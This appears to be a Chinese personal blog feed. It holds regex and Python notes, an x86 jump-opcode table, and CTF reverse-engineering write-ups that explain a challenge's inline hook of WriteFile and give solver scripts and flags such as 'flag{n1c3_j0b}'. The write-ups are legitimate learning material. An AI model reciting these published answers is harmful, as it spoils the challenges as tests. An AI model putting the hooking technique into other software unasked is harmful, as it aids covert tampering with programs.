acgad</td><td>表示匹配一个不是”f”的字符任意次</td></tr><tr><td>[\d]</td><td>412a3bc</td><td>4 1 2 3</td><td>表示匹配任意一个数字，匹配到4个结果</td></tr><tr><td>[\d]+</td><td>412a3bc</td><td>412 3</td><td>表示匹配任意个数字，匹配到2个结果</td></tr></tbody></table><h4 id="4、分组-与-或-｜［-］"><a href="#4、分组-与-或-｜［-］" class="headerlink" title="4、分组 ()与 或 ｜［^］"></a>4、分组 ()与 或 ｜［^］</h4><p>　　身份证号码是一个长度为15或18个字符的字符串，如果是15位则全部由数字组成，首位不能为0；如果是18位，则前17位全部是数字，末位可能是数字或x，下面我们尝试用正则来表示：</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>^[1-9]\d{13,16}[0-9x]$</td><td>110101198001017032</td><td>110101198001017032</td><td>表示可以匹配一个正确的身份证号</td></tr><tr><td>^[1-9]\d{13,16}[0-9x]$</td><td>1101011980010170</td><td>1101011980010170</td><td>表示也可以匹配这串数字，但这并不是一个正确的身份证号码，它是一个16位的数字</td></tr><tr><td>^[1-9]\d{14}(\d{2}[0-9x])?$</td><td>1101011980010170</td><td>False</td><td>现在不会匹配错误的身份证号了()表示分组，将\d{2}[0-9x]分成一组，就可以整体约束他们出现的次数为0-1次</td></tr><tr><td>^([1-9]\d{16}[0-9x]|[1-9]\d{14})$</td><td>110105199812067023</td><td>110105199812067023</td><td>表示先匹配[1-9]\d{16}[0-9x]如果没有匹配上就匹配[1-9]\d{14}</td></tr></tbody></table><h4 id="5、转义符"><a href="#5、转义符" class="headerlink" title="5、转义符 \"></a>5、转义符 \</h4><p>　　在正则表达式中，有很多有特殊意义的是元字符，比如\n和\s等，如果要在正则中匹配正常的”\n”而不是”换行符”就需要对”&quot;进行转义，变成’\‘。</p><p>　　在python中，无论是正则表达式，还是待匹配的内容，都是以字符串的形式出现的，在字符串中\也有特殊的含义，本身还需要转义。所以如果匹配一次”\n”,字符串中要写成’\n’，那么正则里就要写成”\\n”,这样就太麻烦了。这个时候我们就用到了r’\n’这个概念，此时的正则是r’\n’就可以了。</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配 结果</th><th>说明</th></tr></thead><tbody><tr><td>\n</td><td>\n</td><td>False</td><td>因为在正则表达式中\是有特殊意义的字符，所以要匹配\n本身，用表达式\n无法匹配</td></tr><tr><td>\n</td><td>\n</td><td>True</td><td>转义\之后变成\，即可匹配</td></tr><tr><td>“\\n”</td><td>‘\n’</td><td>True</td><td>如果在python中，字符串中的’&#39;也需要转义，所以每一个字符串’&#39;又需要转义一次</td></tr><tr><td>r’\n’</td><td>r’\n’</td><td>True</td><td>在字符串之前加r，让整个字符串不转义</td></tr></tbody></table><h4 id="6、贪婪匹配"><a href="#6、贪婪匹配" class="headerlink" title="6、贪婪匹配"></a>6、贪婪匹配</h4><p>贪婪匹配：在满足匹配时，匹配尽可能长的字符串，默认情况下，采用贪婪匹配</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>&lt;.*&gt;</td><td><script>...<script></td><td><script>...<script></td><td>默认为贪婪匹配模式，会匹配尽量长的字符串</td></tr><tr><td>&lt;.*?&gt;</td><td><script>...<script></td><td><script> <script></td><td>加上？为将贪婪匹配模式转为非贪婪匹配模式，会匹配尽量短的字符串</td></tr></tbody></table><p>几个常用的非贪婪匹配Pattern</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*? 重复任意次，但尽可能少重复</span><br><span class="line">+? 重复1次或更多次，但尽可能少重复</span><br><span class="line">?? 重复0次或1次，但尽可能少重复</span><br><span class="line">&#123;n,m&#125;? 重复n到m次，但尽可能少重复</span><br><span class="line">&#123;n,&#125;? 重复n次以上，但尽可能少重复</span><br></pre></td></tr></table></figure><p>.*?的用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. 是任意字符</span><br><span class="line">* 是取 0 至 无限长度</span><br><span class="line">? 是非贪婪模式。</span><br><span class="line">何在一起就是 取尽量少的任意字符，一般不会这么单独写，他大多用在：</span><br><span class="line">.*?x</span><br><span class="line">就是取前面任意长度的字符，直到一个x出现</span><br></pre></td></tr></table></figure><p>本部分摘自：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">博客园-iveBoy https://www.cnblogs.com/shenjianping/p/11647473.html Python之re模块</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-BABYHOOK-writeup</title>
      <link href="/2022/01/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYHOOK-writeup/"/>
      <url>/2022/01/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYHOOK-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-流浪者-writeup"><a href="#攻防世界Reverse进阶区-流浪者-writeup" class="headerlink" title="攻防世界Reverse进阶区-流浪者-writeup"></a>攻防世界Reverse进阶区-流浪者-writeup</h1><p>本题为较为基础的Hook题，通过本writeup来整理一下思路。</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122143740757.png" alt="image-20220122143740757"></p><p>进入程序，首先确定<code>flag</code>字符串长度为<strong>19</strong>；</p><p>然后发现程序会将输入内容写入文件名为文件<strong>Your_input</strong>的文件；</p><p>最后通过核验<strong>NumberOfBytesWritten</strong>变量是否为1来控制输出；</p><p>此时，若进入<strong>sub_401240</strong>函数就会中计，需手动进行测试。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122144439005.png" alt="image-20220122144439005"></p><p>手动测试后发现输出文件中的内容和输入完全不同，推测可能在<strong>sub_401220</strong>函数中对输入进行了加密。</p><h2 id="sub-401220函数："><a href="#sub-401220函数：" class="headerlink" title="sub_401220函数："></a>sub_401220函数：</h2><p>进入<strong>sub_401220</strong>函数：（为<code>hook</code>关键函数）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122144907695.png" alt="image-20220122144907695"></p><p>其主要内容如下（1~14行）：</p><blockquote><p>获取当前进程号，打开进程到hprocess,libfilename为一常量kernel32.dll，procname为一常量writefile,故dword_409c4（*WriteFile_0位置)、lpaddress所存为writefile的地址，然后程序复制了lpaddress的地址到unk_40c9b4。</p></blockquote><p>然后开始hook操作（15、16行）：</p><p>可以看到第15行有一常量被存入地址<code>40C9BC</code>，H键转化为十六进制 <strong>0xE9</strong></p><p>然后在地址<code>40C9BD</code>存入了函数<code>sub_401080</code>与IpAdress的距离再减去5，即<code>sub_401080</code>与WriteFile函数的距离。</p><p>总结来说，将writeFile函数的前五个字节替换为了跳转到<code>sub_401080</code>的语句。</p><p>回到main函数后，在调用<code>WriteFile</code>函数时，实际调用的是<code>sub_401080</code>，因此进入<code>sub_401080</code>：</p><h2 id="sub-401080函数："><a href="#sub-401080函数：" class="headerlink" title="sub_401080函数："></a>sub_401080函数：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122152116398.png" alt="image-20220122152116398"></p><p>可以看到，此函数内容为，先调用<code>sub_401000</code>，返回值V5；</p><p>然后再在内部调用WriteFile函数；</p><p>最终根据V5的值，判断第四个指针参数<em>lpNumberOfBytesWritten的值，此处的</em>lpNumberOfBytesWritten参数，即对应main函数中的NumberOfBytesWritten关键参数。</p><p>因此，推测<code>sub_401000</code>函数为对于输入的核心判断函数，步入查看：</p><h2 id="sub-401000函数："><a href="#sub-401000函数：" class="headerlink" title="sub_401000函数："></a>sub_401000函数：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122153313662.png" alt="image-20220122153313662"></p><p>输入为a1；a2为固定值19；</p><p>然后下面的逻辑简单的说就是先加密a1，然后比较数组a1每一位的值和储存在 <strong>byte_40A030</strong>处每一位的值。</p><p>直接逆向分析函数思路，发现奇数位是通过本位推导，但偶数位是通过高位推导，因此第0位是无法被推导出的，而18位可以被推导出两次:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122164546365.png" alt="image-20220122164546365"></p><p>脚本如上：猜测第一位是<code>f</code>字符，最终正确。</p><h2 id="汇编跳转函数的总结："><a href="#汇编跳转函数的总结：" class="headerlink" title="汇编跳转函数的总结："></a>汇编跳转函数的总结：</h2><p><a href="https://lhl7.github.io/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/">https://lhl7.github.io/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编跳转指令及其十六进制码</title>
      <link href="/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编跳转指令及其十六进制码"><a href="#汇编跳转指令及其十六进制码" class="headerlink" title="汇编跳转指令及其十六进制码"></a>汇编跳转指令及其十六进制码</h1><p>几种跳转指令和对应的机器码：<br>0xE8 CALL后面的四个字节是地址<br>0xE9 JMP后面的四个字节是偏移<br>0xEB JMP后面的二个字节是偏移<br>0xFF15 CALL后面的四个字节是存放地址的地址<br>0xFF25 JMP后面的四个字节是存放地址的地址<br>0x68 PUSH后面的四个字节入栈<br>0x6AP USH后面的一个字节入栈</p><p>————————————————<br>版权声明：本文为CSDN博主「hincon」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/ccworm/article/details/112787439">https://blog.csdn.net/ccworm/article/details/112787439</a></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-BABYRE-writeup</title>
      <link href="/2022/01/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYRE-writeup/"/>
      <url>/2022/01/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYRE-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-BABYRE-writeup"><a href="#攻防世界Reverse进阶区-BABYRE-writeup" class="headerlink" title="攻防世界Reverse进阶区-BABYRE-writeup"></a>攻防世界Reverse进阶区-BABYRE-writeup</h1><p>以此篇WP记录第一次使用ida解决smc（自解密）</p><p>观察反汇编代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144411257.png" alt="image-20220118144411257"></p><p>第12行调用的函数在第8行被加密了</p><p>因此，需要手动解密观察，双击judge进入：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144605050.png" alt="image-20220118144605050"></p><p>然后使用idapython脚本解决，右上角file、script command</p><p>如图编写代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144725867.png" alt="image-20220118144725867"></p><p>点击run，可以看到内容被改变：</p><p>选中judge函数一行，c（code），将其变成代码，这时的judge被分为三个函数，我们将其合三为1，框选地址<code>B00~BB5</code>（所有红色区域），p（重新生成function）</p><p>此时可以在左侧找到相应函数内容，F5即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118145127875.png" alt="image-20220118145127875"></p><p>然后针对反汇编后的加密算法写一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v2=[<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">127</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">an=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">14</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">        an+=<span class="built_in">chr</span>(<span class="number">127</span>^i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    an+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(v2[i])^i)</span><br><span class="line"><span class="built_in">print</span>(an)</span><br></pre></td></tr></table></figure><p>运行结果为：flag{n1c3_j0b}</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-流浪者-writeup</title>
      <link href="/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-%E6%B5%81%E6%B5%AA%E8%80%85-writeup/"/>
      <url>/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-%E6%B5%81%E6%B5%AA%E8%80%85-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-流浪者-writeup"><a href="#攻防世界Reverse进阶区-流浪者-writeup" class="headerlink" title="攻防世界Reverse进阶区-流浪者-writeup"></a>攻防世界Reverse进阶区-流浪者-writeup</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123155980.png" alt="image-20220117123155980"></p><p><strong>关键函数1：sub_401890</strong></p><p>调用了另一个函数</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123309787.png" alt="image-20220117123309787"></p><p><strong>关键函数2：sub_4017F0</strong></p><p>先传入关键函数1进行加密，加密后进入函数2进行进一步加密，最后与<code>kanXue...</code>字符串对比查验</p><p>逆向脚本书写逻辑即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123519559.png" alt="image-20220117123519559"></p><p>最终运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123544490.png" alt="image-20220117123544490"></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python数据类型以及常用函数（基础）</title>
      <link href="/2022/01/16/python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2022/01/16/python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="python笔记"><a href="#python笔记" class="headerlink" title="python笔记"></a>python笔记</h1><p>Python3 中有六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><p><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</p></li><li><p><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</p></li><li><h2 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h2><p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可，在下一章节 <a href="https://www.runoob.com/python3/python3-type-conversion.html">Python3 数据类型转换</a> 会具体介绍。</p><p>以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">[int(x <a href="https://www.runoob.com/python3/python-func-int.html">,base])</a></td><td align="left">将x转换为一个整数</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-float.html">float(x)</a></td><td align="left">将x转换到一个浮点数</td></tr><tr><td align="left">[complex(real <a href="https://www.runoob.com/python3/python-func-complex.html">,imag])</a></td><td align="left">创建一个复数</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-str.html">str(x)</a></td><td align="left">将对象 x 转换为字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-repr.html">repr(x)</a></td><td align="left">将对象 x 转换为表达式字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-eval.html">eval(str)</a></td><td align="left">用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-tuple.html">tuple(s)</a></td><td align="left">将序列 s 转换为一个元组</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(s)</a></td><td align="left">将序列 s 转换为一个列表</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-set.html">set(s)</a></td><td align="left">转换为可变集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-dict.html">dict(d)</a></td><td align="left">创建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-frozenset.html">frozenset(s)</a></td><td align="left">转换为不可变集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-chr.html">chr(x)</a></td><td align="left">将一个整数转换为一个字符</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-ord.html">ord(x)</a></td><td align="left">将一个字符转换为它的整数值</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-hex.html">hex(x)</a></td><td align="left">将一个整数转换为一个十六进制字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-oct.html">oct(x)</a></td><td align="left">将一个整数转换为一个八进制字符串</td></tr></tbody></table></li></ul><h2 id="一、字符串"><a href="#一、字符串" class="headerlink" title="一、字符串"></a>一、字符串</h2><p>与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如word[0] = ‘m’会导致错误。</p><p>Python 的字符串常用内建函数如下：</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-capitalize.html">capitalize()</a> 将字符串的第一个字符转换为大写</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-center.html">center(width, fillchar)</a>返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-count.html">count(str, beg= 0,end=len(string))</a> 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-decode.html">bytes.decode(encoding=”utf-8”, errors=”strict”)</a> Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-encode.html">encode(encoding=’UTF-8’,errors=’strict’)</a> 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-endswith.html">endswith(suffix, beg=0, end=len(string))</a> 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-expandtabs.html">expandtabs(tabsize=8)</a> 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-find.html">find(str, beg=0, end=len(string))</a> 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-index.html">index(str, beg=0, end=len(string))</a> 跟find()方法一样，只不过如果str不在字符串中会报一个异常。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalnum.html">isalnum()</a> 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalpha.html">isalpha()</a> 如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdigit.html">isdigit()</a> 如果字符串只包含数字则返回 True 否则返回 False..</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-islower.html">islower()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isnumeric.html">isnumeric()</a> 如果字符串中只包含数字字符，则返回 True，否则返回 False</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isspace.html">isspace()</a> 如果字符串中只包含空白，则返回 True，否则返回 False.</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-istitle.html">istitle()</a> 如果字符串是标题化的(见 title())则返回 True，否则返回 False</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isupper.html">isupper()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-join.html">join(seq)</a> 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len(string)</a> 返回字符串长度</td></tr><tr><td align="left">20</td><td align="left">[ljust(width<a href="https://www.runoob.com/python3/python3-string-ljust.html">, fillchar])</a> 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lower.html">lower()</a> 转换字符串中所有大写字符为小写.</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lstrip.html">lstrip()</a> 截掉字符串左边的空格或指定字符。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-maketrans.html">maketrans()</a> 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-max.html">max(str)</a> 返回字符串 str 中最大的字母。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-min.html">min(str)</a> 返回字符串 str 中最小的字母。</td></tr><tr><td align="left">26</td><td align="left">[replace(old, new <a href="https://www.runoob.com/python3/python3-string-replace.html">, max])</a> 把 将字符串中的 old 替换成 new,如果 max 指定，则替换不超过 max 次。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rfind.html">rfind(str, beg=0,end=len(string))</a> 类似于 find()函数，不过是从右边开始查找.</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rindex.html">rindex( str, beg=0, end=len(string))</a> 类似于 index()，不过是从右边开始.</td></tr><tr><td align="left">29</td><td align="left">[rjust(width,<a href="https://www.runoob.com/python3/python3-string-rjust.html">, fillchar])</a> 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rstrip.html">rstrip()</a> 删除字符串末尾的空格或指定字符。</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-split.html">split(str=””, num=string.count(str))</a> 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</td></tr><tr><td align="left">32</td><td align="left">[splitlines(<a href="https://www.runoob.com/python3/python3-string-splitlines.html">keepends])</a> 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td></tr><tr><td align="left">33</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-startswith.html">startswith(substr, beg=0,end=len(string))</a> 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td></tr><tr><td align="left">34</td><td align="left">[strip(<a href="https://www.runoob.com/python3/python3-string-strip.html">chars])</a> 在字符串上执行 lstrip()和 rstrip()</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-swapcase.html">swapcase()</a> 将字符串中大写转换为小写，小写转换为大写</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-title.html">title()</a> 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-translate.html">translate(table, deletechars=””)</a> 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-upper.html">upper()</a> 转换字符串中的小写字母为大写</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-zfill.html">zfill (width)</a> 返回长度为 width 的字符串，原字符串右对齐，前面填充0</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdecimal.html">isdecimal()</a> 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td></tr></tbody></table><h2 id="二、列表"><a href="#二、列表" class="headerlink" title="二、列表"></a>二、列表</h2><p>与Python字符串不一样的是，列表中的元素是可以改变的，如 a[2:5] = [13, 14, 15]。</p><p>Python包含以下函数:</p><table><thead><tr><th align="left">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-len.html">len(list)</a> 列表元素个数</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-max.html">max(list)</a> 返回列表元素最大值</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-min.html">min(list)</a> 返回列表元素最小值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(seq)</a> 将元组转换为列表</td></tr></tbody></table><p>Python包含以下方法:</p><table><thead><tr><th align="left">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-append.html">list.append(obj)</a> 在列表末尾添加新的对象</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-count.html">list.count(obj)</a> 统计某个元素在列表中出现的次数</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-extend.html">list.extend(seq)</a> 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-index.html">list.index(obj)</a> 从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-insert.html">list.insert(index, obj)</a> 将对象插入列表</td></tr><tr><td align="left">6</td><td align="left">[list.pop(<a href="https://www.runoob.com/python3/python3-att-list-pop.html">index=-1])</a> 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-remove.html">list.remove(obj)</a> 